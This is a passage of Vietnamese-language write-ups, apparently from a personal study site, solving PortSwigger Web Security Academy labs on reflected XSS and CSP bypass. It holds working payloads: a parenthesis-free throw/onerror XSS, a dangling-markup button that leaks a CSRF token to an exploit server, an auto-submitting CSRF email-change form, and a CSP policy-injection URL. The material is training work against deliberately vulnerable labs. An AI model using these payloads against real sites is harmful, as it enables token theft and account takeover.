+<p>Tuy nhiên, chỉ khi thực sự load được trang web thì path của chúng ta mới đẩy vào câu lệnh js này tức là postId cần phải hợp lệ nhưng cũng phải chứa payload (1 postId không hợp lệ). Vì cả path được đẩy vào fetch nên ta có thể truyền payload thêm bằng cách thêm một param khác ⇒ vừa lấy được postId đúng vừa truyền được payload</p>
+</li>
+<li>
+<p>Như vậy, câu lệnh ban đầu sẽ như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="mf">5</span><span class="o">&amp;</span><span class="nx">a</span><span class="err">&#39;</span><span class="p">}),</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó chúng ta cần phải tạo ra một lệnh alert, nhưng mà khi truyền dấu <code>()</code> thì code xử lý xóa dấu này ⇒ dùng cách trong lý thuyết nhắc đến là throw. Ngoài ra thì dấu trắng cũng bị encode thành dấu <code>+</code> nên ta sẽ dùng <code>/**/</code> thay thế khoảng trắng</p>
+<ul>
+<li>
+<p>Dấu <code>+</code> bị encode</p>
+<p><img alt="image.png" src="image%2088.png" /></p>
+</li>
+<li>
+<p>Payload đúng</p>
+<div class="highlight"><pre><span></span><code><span class="mf">5</span><span class="o">&amp;</span><span class="nx">a</span><span class="s1">&#39;}),x=x=&gt;{throw/**/onerror=alert,1},toString=x,window+&#39;</span><span class="nx">abc</span><span class="s1">&#39;,{x:&#39;</span><span class="nx">a</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Giải thích payload như sau:</p>
+<ul>
+<li>
+<p>Mọi thứ trong js đều là hàm vì vậy ta có thể gán biến x sau:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">x</span><span class="o">=</span><span class="nx">x</span><span class="p">=&gt;{</span><span class="k">throw</span><span class="cm">/**/</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">,</span><span class="mf">1</span><span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Sau đó, để gọi <code>function x</code> chúng ta không thể dùng <code>x()</code> được vì dấu <code>()</code> bị xóa ⇒ cần gọi hàm kiểu magic tự động gọi như là <code>toString</code> ⇒ overwrite bằng cách sau:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">toString</span><span class="o">=</span><span class="nx">x</span>
+</code></pre></div>
+</li>
+<li>
+<p>Tiếp theo, để gọi <code>toString</code> chúng ta chỉ cần dùng lệnh sau là tự động gọi</p>
+<div class="highlight"><pre><span></span><code><span class="nb">window</span><span class="o">+</span><span class="s1">&#39;abc&#39;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Sau đó, để tránh lệnh bị lỗi mà không chạy được, cần nối tiếp phần đóng ngoặc như sau:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="err">&#39;</span><span class="nx">a</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi payload, nhấn vào <code>Back to blog</code> và alert thành công. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2089.png" /></p>
+<p><img alt="image.png" src="image%2090.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack"><strong>Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</strong><a class="headerlink" href="#lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code></li>
+<li>
+<p>Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2091.png" /></p>
+</li>
+<li>
+<p>Quan sát khi inspect thì thấy trường email được reflect</p>
+<p><img alt="image.png" src="image%2092.png" /></p>
+</li>
+<li>
+<p>Thực hiện escape thì các dấu reflect không bị encode. Tuy nhiên thì không thể gọi được một url từ ngoài do csp (img-src 'self’)</p>
+<ul>
+<li>
+<p>POC</p>
+<ul>
+<li>
+<p>Payload khi được render không bị encode</p>
+<p><img alt="image.png" src="image%2093.png" /></p>
+</li>
+<li>
+<p>CSP</p>
+<p><img alt="image.png" src="image%2094.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, với nhưng thẻ html và người dùng click vào vẫn có thể truy cập ⇒ sử dụng anchor để user click đến một link và lấy được <code>csrf</code> token (ở đây không lấy được cookie một là script inline không chạy được do csp ngoài ra do cờ <code>Secure only</code> đã được bật nên không lấy được cookie)</p>
+</li>
+<li>
+<p>Thực hiện chèn payload sau, nhận thấy khi tự click vào thì csrf token trả về exploit server</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">a1</span><span class="err">@</span><span class="nx">a</span><span class="p">.</span><span class="nx">com</span><span class="s2">&quot;&gt;&lt;button formaction=&quot;</span><span class="nx">https</span><span class="o">:</span><span class="c1">//exploit-0ae300a403a4e83280d30c87012900a9.exploit-server.net/exploit&quot; formmethod=&quot;get&quot;&gt;Click me&lt;/button&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Giải thích: vì vị trí chèn được payload là trong form nên có thể thêm button và submit kèm cả csrf token. Tuy nhiên, nếu đơn thuần là form chỉ có POST request gửi đi ⇒ trong log không có csrf token ⇒ dùng <code>formmethod="get"</code></p>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2095.png" /></p>
+</li>
+<li>
+<p>Khi click thì có csrf trả về exploit server</p>
+<p><img alt="image.png" src="image%2096.png" /></p>
+<p><img alt="image.png" src="image%2097.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiệ gửi link sau cho victim để lấy 1 csrf token hợp lệ</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9600aa047885c1806a035a00870049.web-security-academy.net/my-account?id=wiener&amp;email=a1@a.com%22%3E%3Cbutton%20formaction=%22https://exploit-0ae300a403a4e83280d30c87012900a9.exploit-server.net/exploit%22%20formmethod=%22get%22%3EClick%20me%3C/button%3E</span>
+</code></pre></div>
+</li>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;vuln-web&gt;?email=a11111@a.com&quot;&gt;&lt;button formaction=&quot;&lt;exploit-server&gt;/exploit&quot; formmethod=&quot;get&quot;&gt;Click me&lt;/button&gt;&#39;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Full config</p>
+<p><img alt="image.png" src="image%2098.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi cho victim. Quan sát trong <code>Access log</code> của <code>Exploit server</code> . Nhận thấy csrf token đã có trong log ⇒ lấy để làm csrf attack (có thể nhận biết request nào của victim gửi nhờ user agent)</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2099.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truy cập vào chức năng <code>Update email</code>. Thực hiện update email. Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/change-email</code> . Thực hiện gen form như sau</p>
+<ul>
+<li>
+<p>Tạo form</p>
+<ul>
+<li>
+<p>Tạo form bằng Burpsuite</p>
+<p><img alt="image.png" src="image%20100.png" /></p>
+</li>
+<li>
+<p>Thay email <a href="mailto:hacker@evil-user.net"><code>hacker@evil-user.net</code></a></p>
+<p><img alt="image.png" src="image%20101.png" /></p>
+</li>
+<li>
+<p>Thay csrf token của victim</p>
+<p><img alt="image.png" src="image%20102.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Copy HTML, gửi cho victim</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="c">&lt;!--</span><span class="w"> </span><span class="nx">CSRF</span><span class="w"> </span><span class="nx">PoC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">generated</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">Burp</span><span class="w"> </span><span class="nx">Suite</span><span class="w"> </span><span class="nx">Professional</span><span class="w"> </span><span class="o">--&gt;</span>
+<span class="w">  </span><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">&lt;</span><span class="nt">form</span><span class="w"> </span><span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0a9600aa047885c1806a035a00870049.web-security-academy.net/my-account/change-email&quot;</span><span class="w"> </span><span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="w"> </span><span class="na">value</span><span class="o">=</span><span class="s">&quot;hacker&amp;#64;evil&amp;#45;user&amp;#46;net&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">      </span><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span><span class="w"> </span><span class="na">value</span><span class="o">=</span><span class="s">&quot;T8UMhMIhqVCsGej2G1isFcEmmFK9vxoc&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">      </span><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="w"> </span><span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Exploit server config</p>
+<p><img alt="image.png" src="image%20103.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Đổi mail victim thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%20104.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-protected-by-csp-with-csp-bypass"><strong>Lab: Reflected XSS protected by CSP, with CSP bypass</strong><a class="headerlink" href="#lab-reflected-xss-protected-by-csp-with-csp-bypass" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass">Lab: Reflected XSS protected by CSP, with CSP bypass | Web Security Academy</a></p>
+<ul>
+<li>Em đọc ý tưởng của bài Research này chỗ token <a href="https://portswigger.net/research/bypassing-csp-with-policy-injection">Bypassing CSP with policy injection | PortSwigger Research</a></li>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code>. Trong phần mềm Burpsuite, thực hiện quan sát response của API <code>GET /?search=</code> có chứa header <code>Content-Security-Policy</code> ngăn không cho load script inline hoặc từ nguồn khác…</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%20105.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, khi quan sát ở cuối có đoạn lấy param <code>token</code> ⇒ thử truyền thêm như trong bài research quan sát thấy thay đổi được header</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abc</span><span class="p">;</span><span class="w"> </span><span class="nx">script</span><span class="o">-</span><span class="nx">src</span><span class="o">-</span><span class="nx">elem</span><span class="w"> </span><span class="s1">&#39;none&#39;</span><span class="p">;</span><span class="w"> </span><span class="nx">script</span><span class="o">-</span><span class="nx">src</span><span class="o">-</span><span class="nx">attr</span><span class="w"> </span><span class="s1">&#39;unsafe-inline&#39;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%20106.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truyền payload vào tham số <code>search</code> đồng thời inject vào header thì alert thành công. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">/?search=%3cimg%20src%3d%221%22%20onerror%3d%22alert(&#39;This%20will%20be%20allowed&#39;)%22%3e&amp;token=abc%3b%20script-src-elem%20&#39;none&#39;%3b%20script-src-attr%20&#39;unsafe-inline&#39;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%20107.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
